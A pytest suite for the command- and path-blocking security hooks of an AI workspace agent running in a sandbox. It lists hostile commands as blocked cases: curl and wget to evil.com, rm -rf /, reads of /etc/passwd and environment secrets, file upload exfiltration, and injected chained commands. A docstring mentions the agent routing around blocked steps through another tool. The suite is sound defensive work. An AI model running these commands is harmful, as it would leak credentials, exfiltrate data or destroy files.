"""
Tests for security hooks — specifically the false-positive fix for
JSON content containing forward slashes (e.g. "loan/credit") being
mistaken for file paths.
"""

import pytest
from numa_workspace_agent.hooks.security import (
    check_bash_command,
    is_blocked_path,
    strip_data_content,
)

# ── strip_data_content tests ─────────────────────────────────────────────────


class TestStripDataContent:
    def test_strips_heredoc_body(self):
        cmd = 'cat > /workdir/tmp/out.json << \'EOF\'\n{"method": "loan/credit"}\nEOF'
        result = strip_data_content(cmd)
        assert "loan/credit" not in result
        assert "/workdir/tmp/out.json" in result

    def test_strips_unquoted_heredoc(self):
        cmd = 'cat > /workdir/tmp/out.json << EOF\n{"method": "loan/credit"}\nEOF'
        result = strip_data_content(cmd)
        assert "loan/credit" not in result

    def test_strips_heredoc_with_dash(self):
        cmd = 'cat > /workdir/tmp/out.json <<- \'HEREDOC\'\n\t{"value": "Pass/Fail"}\n\tHEREDOC'
        result = strip_data_content(cmd)
        assert "Pass/Fail" not in result

    def test_strips_python_c_double_quoted(self):
        cmd = "python3 -c \"import json; data = {'method': 'loan/credit'}\""
        result = strip_data_content(cmd)
        assert "loan/credit" not in result

    def test_strips_python_c_single_quoted(self):
        cmd = 'python3 -c \'import json; data = {"method": "loan/credit"}\''
        result = strip_data_content(cmd)
        assert "loan/credit" not in result

    def test_strips_node_e_inline(self):
        cmd = """node -e "console.log('date/time/venue')" """
        result = strip_data_content(cmd)
        assert "date/time" not in result

    def test_preserves_command_paths(self):
        cmd = "cp /workdir/uploads/file.pdf /workdir/outputs/file.pdf"
        result = strip_data_content(cmd)
        assert "/workdir/uploads/file.pdf" in result
        assert "/workdir/outputs/file.pdf" in result

    def test_no_heredoc_passthrough(self):
        cmd = "ls /workdir/outputs/"
        result = strip_data_content(cmd)
        assert result == cmd

    def test_strips_stderr_redirect(self):
        cmd = "ls /workdir/outputs/ 2>/dev/null"
        result = strip_data_content(cmd)
        assert "/dev/null" not in result
        assert "/workdir/outputs/" in result

    def test_strips_stdout_redirect(self):
        cmd = "echo hello >/dev/null"
        result = strip_data_content(cmd)
        assert "/dev/null" not in result

    def test_strips_append_redirect(self):
        cmd = "echo hello >>/workdir/tmp/log.txt 2>/dev/null"
        result = strip_data_content(cmd)
        assert "/dev/null" not in result

    def test_strips_redirect_with_space(self):
        cmd = "command 2> /dev/null"
        result = strip_data_content(cmd)
        assert "/dev/null" not in result


# ── check_bash_command: false-positive fix ────────────────────────────────────


class TestBashCommandJsonContent:
    """Verify that JSON content with slashes in heredocs/inline code is allowed."""

    def test_heredoc_with_slash_content_allowed(self):
        cmd = (
            "cat > /workdir/tmp/compliance_findings.json << 'EOF'\n"
            '{"procurement_method": "loan/credit", "source": "UNDB/dgMarket/national press"}\n'
            "EOF"
        )
        blocked, reason = check_bash_command(cmd)
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_heredoc_with_multiple_slash_strings(self):
        cmd = (
            "cat > /workdir/tmp/results.json << 'EOF'\n"
            '{"a": "date/time/venue", "b": "Pass/Fail", "c": "loan/credit"}\n'
            "EOF"
        )
        blocked, reason = check_bash_command(cmd)
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_python_heredoc_with_slash_content(self):
        cmd = (
            "python3 - << 'PYEOF'\n"
            "import json\n"
            "data = {'method': 'loan/credit'}\n"
            "with open('/workdir/tmp/out.json', 'w') as f:\n"
            "    json.dump(data, f)\n"
            "PYEOF"
        )
        blocked, reason = check_bash_command(cmd)
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_python_c_with_slash_content(self):
        cmd = """python3 -c "import json; json.dump({'method': 'loan/credit'}, open('/workdir/tmp/out.json', 'w'))" """
        blocked, reason = check_bash_command(cmd)
        assert not blocked, f"Should be allowed but got: {reason}"


# ── check_bash_command: security still enforced ──────────────────────────────


class TestBashCommandSecurityStillWorks:
    """Verify that actual security threats are still blocked."""

    def test_path_outside_workdir_blocked(self):
        blocked, _ = check_bash_command("cat /etc/passwd")
        assert blocked

    def test_direct_etc_blocked(self):
        blocked, _ = check_bash_command("cat /etc/passwd")
        assert blocked

    def test_curl_blocked(self):
        blocked, _ = check_bash_command("curl http://evil.com")
        assert blocked

    def test_rm_rf_root_blocked(self):
        blocked, _ = check_bash_command("rm -rf /")
        assert blocked

    def test_system_path_in_command_position_blocked(self):
        """Paths outside /workdir in the actual command (not content) are blocked."""
        blocked, _ = check_bash_command("cp /tmp/evil.sh /workdir/script.sh")
        assert blocked

    def test_workdir_paths_allowed(self):
        blocked, _ = check_bash_command(
            "cp /workdir/uploads/file.pdf /workdir/outputs/file.pdf"
        )
        assert not blocked

    def test_simple_workdir_write_allowed(self):
        blocked, _ = check_bash_command("echo 'hello' > /workdir/tmp/test.txt")
        assert not blocked

    def test_dangerous_python_still_blocked(self):
        blocked, _ = check_bash_command("python3 -c \"import os; os.system('ls')\"")
        assert blocked

    def test_env_access_still_blocked(self):
        blocked, _ = check_bash_command("printenv")
        assert blocked

    def test_protected_dirs_still_blocked(self):
        blocked, _ = check_bash_command("ls /workdir/.system/")
        assert blocked


# ── check_bash_command: numa CLI relative URL paths ──────────────────────────


class TestNumaCliRelativeUrlPaths:
    """The numa CLI takes relative URL paths (e.g. `GET /jobs`) as request
    args. These must be allowed — but ONLY as a numa request URL (preceded by
    an HTTP method), never as a filesystem-path arg or in a non-numa command.
    """

    @pytest.mark.parametrize(
        "cmd",
        [
            "numa integrations request synergy GET /jobs",
            "numa integrations request synergy GET /api/v1/jobs",
            'numa integrations request gdrive GET "/drive/v3/files?q=name"',
            "numa integrations request xero POST /v1/invoices --body '{}'",
            "numa-dev integrations request synergy get /jobs",
        ],
    )
    def test_numa_request_relative_url_allowed(self, cmd):
        blocked, reason = check_bash_command(cmd)
        assert not blocked, f"should be allowed: {cmd} ({reason})"

    @pytest.mark.parametrize(
        "cmd",
        [
            # Not a numa command — a leading-slash token after "GET" must still
            # be treated as a filesystem path (cat reads /etc/passwd here).
            "cat GET /etc/passwd",
            # numa upload reads a LOCAL file — the path is preceded by `upload`,
            # not a method, so it stays blocked (no exfiltration via upload).
            "numa files upload /etc/passwd --to Personal",
            # output flag is not a method position — arbitrary write stays blocked.
            "numa integrations download-file synergy 123 -o /etc/cron.d/x",
            # chained filesystem read after a valid numa request is still caught.
            "numa integrations request synergy GET /jobs; cat /etc/passwd",
        ],
    )
    def test_filesystem_paths_still_blocked(self, cmd):
        blocked, _ = check_bash_command(cmd)
        assert blocked, f"should be blocked: {cmd}"


# ── check_bash_command: /dev/null redirection fix ─────────────────────────────


class TestDevNullRedirect:
    """Verify that /dev/null redirections are allowed (shell syntax, not file access)."""

    def test_stderr_redirect_allowed(self):
        blocked, reason = check_bash_command("ls /workdir/outputs/ 2>/dev/null")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_stderr_redirect_with_space_allowed(self):
        blocked, reason = check_bash_command("command 2> /dev/null || true")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_stdout_redirect_allowed(self):
        blocked, reason = check_bash_command("echo hello >/dev/null")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_combined_redirect_allowed(self):
        blocked, reason = check_bash_command("command &>/dev/null")
        assert not blocked, f"Should be allowed but got: {reason}"


# ── check_bash_command: re.compile() fix ──────────────────────────────────────


class TestReCompileFix:
    """Verify that re.compile() is allowed but standalone compile() is blocked."""

    def test_re_compile_allowed(self):
        blocked, reason = check_bash_command(
            "python3 -c \"import re; p = re.compile(r'pattern')\""
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_standalone_compile_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"code = compile('print(1)', '<string>', 'exec')\""
        )
        assert blocked


# ── New positive cases: things we want to allow now ──────────────────────────


class TestLegitimatePatterns:
    """Legitimate constructs that previously false-positive-blocked.

    Each of these was the root cause of a cost-amplifying bypass to
    `execute_script` in a production trace.
    """

    def test_import_os_with_path_getsize(self):
        blocked, reason = check_bash_command(
            "python3 -c \"import os; print(os.path.getsize('/workdir/outputs/x.csv'))\""
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_import_shutil_workdir_copy(self):
        blocked, reason = check_bash_command(
            "python3 -c \"import shutil; shutil.copy('/workdir/uploads/a.pdf', '/workdir/outputs/a.pdf')\""
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_pandas_read_excel_workdir(self):
        blocked, reason = check_bash_command(
            "python3 -c \"import pandas as pd; df = pd.read_excel('/workdir/uploads/data.xlsx')\""
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_base64_decode_payload(self):
        blocked, reason = check_bash_command(
            "python3 -c \"import base64; data = base64.b64decode(b'aGVsbG8=')\""
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_python_c_with_hash_comment_and_etc_in_string(self):
        """The av-media false positive: '\\n#' inside -c body broke regex."""
        blocked, reason = check_bash_command(
            'python3 -c "import json\\n# comment with /etc/passwd in it\\nprint(1)"'
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_echo_with_slash_in_quoted_string(self):
        """The av-media false positive: '/missing' was scanned as a path."""
        blocked, reason = check_bash_command('echo "outputs empty/missing"')
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_ls_workdir_outputs_allowed(self):
        blocked, reason = check_bash_command("ls /workdir/outputs")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_ls_workdir_tmp_allowed(self):
        blocked, reason = check_bash_command("ls /workdir/tmp")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_run_python_script_in_tmp(self):
        """The Write+Bash+Edit flow we're enabling: run a script from /workdir/tmp."""
        blocked, reason = check_bash_command("python3 /workdir/tmp/build_deck.py")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_run_node_script_in_tmp(self):
        blocked, reason = check_bash_command("node /workdir/tmp/create_deck.js")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_node_inline_with_process_exit_in_catch(self):
        """The moira-shire $2.30 false positive: process.exit(1) in legitimate .catch."""
        blocked, reason = check_bash_command(
            'node -e "main().catch(e => { console.error(e); process.exit(1); })"'
        )
        # process.exit alone should NOT trigger; only `new Function(...)` and other
        # listed Node patterns do.
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_node_inline_with_function_constructor_call(self):
        """Legitimate Function-as-constructor (PptxGenJS style) should not trigger."""
        blocked, reason = check_bash_command(
            'node -e "const arr = Array.from({length: 3}, (_, i) => i)"'
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_python_path_string_in_comment_allowed(self):
        """Path strings in comments/docstrings must not be scanned as function args."""
        blocked, reason = check_bash_command(
            'python3 -c "x = 1  # do not ever touch /etc/passwd"'
        )
        assert not blocked, f"Should be allowed but got: {reason}"


# ── Boundary regressions: the real security boundary must still hold ─────────


class TestBoundaryRegressions:
    """Verify the real boundary remains intact after the false-positive cleanup."""

    def test_subprocess_import_still_blocked(self):
        blocked, _ = check_bash_command('python3 -c "import subprocess"')
        assert blocked

    def test_socket_import_still_blocked(self):
        blocked, _ = check_bash_command('python3 -c "import socket; socket.socket()"')
        assert blocked

    def test_pickle_loads_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"import pickle; pickle.loads(b'')\""
        )
        assert blocked

    def test_os_environ_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"import os; print(os.environ['AWS_SECRET_ACCESS_KEY'])\""
        )
        assert blocked

    def test_os_system_still_blocked(self):
        blocked, _ = check_bash_command("python3 -c \"import os; os.system('ls')\"")
        assert blocked

    def test_subprocess_run_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"import subprocess; subprocess.run(['ls'])\""
        )
        assert blocked

    def test_builtins_bypass_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"__builtins__['__import__']('subprocess')\""
        )
        assert blocked

    def test_open_etc_passwd_still_blocked(self):
        blocked, _ = check_bash_command("python3 -c \"open('/etc/passwd').read()\"")
        assert blocked

    def test_subprocess_with_etc_path_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"import subprocess; subprocess.run(['/bin/ls', '/etc'])\""
        )
        assert blocked

    def test_path_proc_still_blocked(self):
        blocked, _ = check_bash_command(
            "python3 -c \"from pathlib import Path; Path('/proc/self/environ').read_text()\""
        )
        assert blocked

    def test_pip_install_still_blocked(self):
        blocked, _ = check_bash_command("pip install evil-package")
        assert blocked

    def test_npm_install_still_blocked(self):
        blocked, _ = check_bash_command("npm install evil-package")
        assert blocked

    def test_curl_still_blocked(self):
        blocked, _ = check_bash_command("curl https://evil.com")
        assert blocked

    def test_wget_still_blocked(self):
        blocked, _ = check_bash_command("wget https://evil.com/x.sh")
        assert blocked

    def test_cat_etc_passwd_still_blocked(self):
        blocked, _ = check_bash_command("cat /etc/passwd")
        assert blocked

    def test_cp_from_outside_workdir_still_blocked(self):
        blocked, _ = check_bash_command("cp /tmp/evil.sh /workdir/script.sh")
        assert blocked

    def test_ls_la_workdir_root_still_blocked(self):
        """ls -la /workdir would reveal the hidden .system directory."""
        blocked, _ = check_bash_command("ls -la /workdir")
        assert blocked

    def test_find_workdir_root_still_blocked(self):
        blocked, _ = check_bash_command("find /workdir -type f")
        assert blocked

    def test_node_child_process_still_blocked(self):
        blocked, _ = check_bash_command(
            "node -e \"require('child_process').exec('ls')\""
        )
        assert blocked

    def test_node_process_env_still_blocked(self):
        blocked, _ = check_bash_command('node -e "console.log(process.env.AWS_KEY)"')
        assert blocked

    def test_node_new_function_still_blocked(self):
        blocked, _ = check_bash_command(
            "node -e \"const f = new Function('return 1')\""
        )
        assert blocked

    def test_node_eval_still_blocked(self):
        blocked, _ = check_bash_command("node -e \"eval('1+1')\"")
        assert blocked

    def test_numa_cli_via_bash_still_blocked(self):
        blocked, _ = check_bash_command("python3 /workdir/tools/numa/agents.py list")
        assert blocked

    def test_dotenv_access_still_blocked(self):
        blocked, _ = check_bash_command("cat /workdir/.env")
        assert blocked

    def test_system_dir_access_still_blocked(self):
        blocked, _ = check_bash_command("ls /workdir/.system/")
        assert blocked

    def test_secrets_dir_access_still_blocked(self):
        blocked, _ = check_bash_command("cat /workdir/secrets/api_key")
        assert blocked

    def test_bash_dash_c_wrapper_still_blocked(self):
        blocked, _ = check_bash_command("bash -c 'echo hello'")
        assert blocked

    def test_sudo_still_blocked(self):
        blocked, _ = check_bash_command("sudo ls")
        assert blocked


# ── /dev/null variants and shell redirection edge cases ──────────────────────


class TestDevPathHandling:
    """The new tokenized path scan must allow harmless /dev/* but block others."""

    def test_dev_null_redirect_token_form(self):
        """`> /dev/null` (space-separated) tokenizes /dev/null as its own token."""
        blocked, reason = check_bash_command("ls /workdir > /dev/null")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_dev_stderr_redirect(self):
        blocked, reason = check_bash_command("ls /workdir 2> /dev/stderr")
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_dev_zero_read_blocked(self):
        """Other /dev/* paths are not on the allowlist."""
        blocked, _ = check_bash_command("cat /dev/sda")
        assert blocked

    def test_proc_self_blocked(self):
        blocked, _ = check_bash_command("cat /proc/self/environ")
        assert blocked


# ── Deny-response error message branching ────────────────────────────────────


class TestDenyResponseRemediation:
    """The deny response now carries a category-aware remediation hint, not
    boilerplate about /etc/home/tmp regardless of cause."""

    def test_python_pattern_remediation_mentions_workdir_tmp(self):
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response("Dangerous Python pattern detected: r'subprocess'")
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "/workdir/tmp/" in msg
        assert "os.path" in msg

    def test_node_pattern_remediation_mentions_workdir_tmp(self):
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response("Dangerous Node.js pattern detected: r'child_process'")
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "/workdir/tmp/" in msg

    def test_dangerous_command_remediation_mentions_no_egress(self):
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response("Dangerous command blocked: curl ")
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "no network egress" in msg.lower()

    def test_env_access_remediation_mentions_credentials(self):
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response(
            "Environment variable access is blocked to protect secrets"
        )
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "credentials" in msg.lower() or "aws" in msg.lower()

    def test_unknown_reason_falls_through_to_generic(self):
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response("Some unexpected reason format")
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        # Falls through to the generic hint
        assert "/workdir/" in msg

    def test_read_system_path_block_mentions_tool_results_allowlist(self):
        """The Read path's `.system/` block (e.g. via is_blocked_path) must
        give the same SDK-tool-results allowlist hint as the Bash `ls -la`
        path. Test data from nd-labs reports showed these two paths giving
        different hints — fixed."""
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response(
            "Access to 'workdir/.system' is blocked by security policy"
        )
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "tool-results" in msg
        assert "SDK" in msg or "sdk" in msg.lower()

    def test_outside_workspace_block_does_not_mention_tool_results(self):
        """Generic 'access outside workspace' shouldn't get the .system
        allowlist hint — wrong category."""
        from numa_workspace_agent.hooks.security import deny_response

        resp = deny_response("Access outside workspace '/workdir' is blocked")
        msg = resp["hookSpecificOutput"]["permissionDecisionReason"]
        assert "tool-results" not in msg


# ── SDK tool-results allowlist ───────────────────────────────────────────────


class TestSdkToolResultsAllowlist:
    """The Claude Agent SDK persists oversized tool outputs to
    /workdir/.system/.claude/projects/<id>/tool-results/<tool_use_id>.<ext>
    (`.json` for JSON payloads, `.txt` for plain-text output like Bash stdout)
    and tells the model to Read them. Without an allowlist the security hook
    blocks the Read and the SDK+hook contradict each other.

    The allowlist is narrowly scoped to that exact path shape AND to the Read
    tool only — Write/Edit/Glob/Grep and Bash listing still block.
    """

    TOOL_RESULT_PATH = (
        "/workdir/.system/.claude/projects/abc-123/tool-results/"
        "toolu_bdrk_01ABCDEFGHIJ.json"
    )

    def test_read_allowed_on_tool_result_json(self):
        blocked, reason = is_blocked_path(
            self.TOOL_RESULT_PATH, allow_sdk_tool_results=True
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_write_still_blocked_on_tool_result_json(self):
        """Allowlist must NOT extend to Write — model should not be able to
        forge tool-result files in the SDK's persistence directory."""
        blocked, _ = is_blocked_path(
            self.TOOL_RESULT_PATH, allow_sdk_tool_results=False
        )
        assert blocked

    def test_other_system_paths_still_blocked_even_for_read(self):
        """Allowlist is exact-shape: only tool-results/*.json, nothing else."""
        blocked, _ = is_blocked_path(
            "/workdir/.system/.claude/projects/abc/sessions/xyz.json",
            allow_sdk_tool_results=True,
        )
        assert blocked

    def test_random_system_file_still_blocked(self):
        blocked, _ = is_blocked_path(
            "/workdir/.system/memory_paths.auto", allow_sdk_tool_results=True
        )
        assert blocked

    def test_tool_results_subdirectory_traversal_blocked(self):
        """Can't escape into a sibling .system directory via the tool-results pattern."""
        blocked, _ = is_blocked_path(
            "/workdir/.system/.claude/projects/abc/tool-results/../../sessions/x.json",
            allow_sdk_tool_results=True,
        )
        assert blocked

    def test_txt_in_tool_results_allowed(self):
        """The SDK writes `.txt` sidecars for plain-text tool output (e.g. Bash
        stdout). These must be Readable too — a `.json`-only allowlist silently
        blocked them and the model was handed a path it couldn't open."""
        blocked, reason = is_blocked_path(
            "/workdir/.system/.claude/projects/abc/tool-results/toolu_xyz.txt",
            allow_sdk_tool_results=True,
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_extensionless_tool_result_allowed(self):
        """No extension constraint — any single filename component is fine."""
        blocked, reason = is_blocked_path(
            "/workdir/.system/.claude/projects/abc/tool-results/toolu_xyz",
            allow_sdk_tool_results=True,
        )
        assert not blocked, f"Should be allowed but got: {reason}"

    def test_nested_subdir_in_tool_results_blocked(self):
        """Allowlist requires exactly one filename component after tool-results/."""
        blocked, _ = is_blocked_path(
            "/workdir/.system/.claude/projects/abc/tool-results/nested/x.json",
            allow_sdk_tool_results=True,
        )
        assert blocked

    def test_bash_cat_tool_result_still_blocked(self):
        """Bash never gets the allowlist — model can't ls/cat the directory."""
        blocked, _ = check_bash_command(
            f"cat {TestSdkToolResultsAllowlist.TOOL_RESULT_PATH}"
        )
        assert blocked

    def test_bash_ls_tool_results_dir_still_blocked(self):
        blocked, _ = check_bash_command(
            "ls /workdir/.system/.claude/projects/abc/tool-results/"
        )
        assert blocked


# ── System-info commands: boundary match, not substring ──────────────────────
# Regression: bare "whoami"/"uname"/... in DANGEROUS_COMMANDS substring-matched
# `numa whoami` (a vetted CLI subcommand) and quoted args. They're now anchored
# to a command boundary in ENV_VAR_PATTERNS.


class TestSystemInfoCommandBoundary:
    @pytest.mark.parametrize(
        "cmd",
        [
            "numa whoami -m x",
            "numa whoami --json -m hi",
            'numa files search "whoami tool" -m x',
            'numa memory add "check my uname later" -m x',
        ],
    )
    def test_numa_subcommands_and_args_allowed(self, cmd):
        blocked, _ = check_bash_command(cmd)
        assert not blocked, f"should be allowed: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "whoami",
            "foo; whoami",
            "uname -a",
            "echo hi | hostname",
            "groups",
            "$(whoami)",
        ],
    )
    def test_bare_system_info_commands_blocked(self, cmd):
        blocked, _ = check_bash_command(cmd)
        assert blocked, f"should be blocked: {cmd}"
